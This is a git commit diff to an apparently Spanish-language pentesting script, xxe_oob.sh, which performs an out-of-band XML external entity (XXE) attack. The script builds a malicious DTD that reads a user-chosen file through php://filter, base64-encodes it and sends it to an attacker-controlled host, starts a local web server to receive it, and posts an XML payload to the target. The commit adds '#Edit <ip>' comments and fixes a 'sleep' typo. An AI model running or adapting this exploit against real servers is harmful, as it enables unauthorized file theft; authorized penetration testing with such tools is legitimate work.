9753384ab09b7a34d3fd8d139520c6ca89dcad8b
Fer J García Molina <fergarciamolina99@gmail.com>
2025-02-05 17:16:07 +0100

    update files

--- Tools/Fingerprinting/Owasp_tools/XXE/xxe_oob.sh
+++ Tools/Fingerprinting/Owasp_tools/XXE/xxe_oob.sh
@@ -2,9 +2,10 @@
 
 echo -ne "\n [+] Introducir el fichero a leer: " && read -r myFilename
 
+#Edit <ip>
 malicious_dtd="""
 <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
-<!ENTITY % eval SYSTEM \"<!ENTITY &#x25; exfil SYSTEM 'http://<ip>/?file=%file;'>\">
+<!ENTITY % eval SYSTEM \"<!ENTITY &#x25; exfil SYSTEM 'http://<ip>/?file=%file;'>\"> 
 %eval
 %exfil;
 """
@@ -15,8 +16,9 @@ python3 -m http.server 80 &>response &
 
 PID=$!
 
-sleep1; echo
+sleep 1; echo
 
+#Edit <ip> / <your_ip>
 curl -s -X POST "http://<ip>" -d '<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<your_ip>malicious.dtd"> %xxe;]>
 <root><name>test</name><tel>11234421</tel><email>test@test.com</email><password>test123</password></root>' &>/dev/null
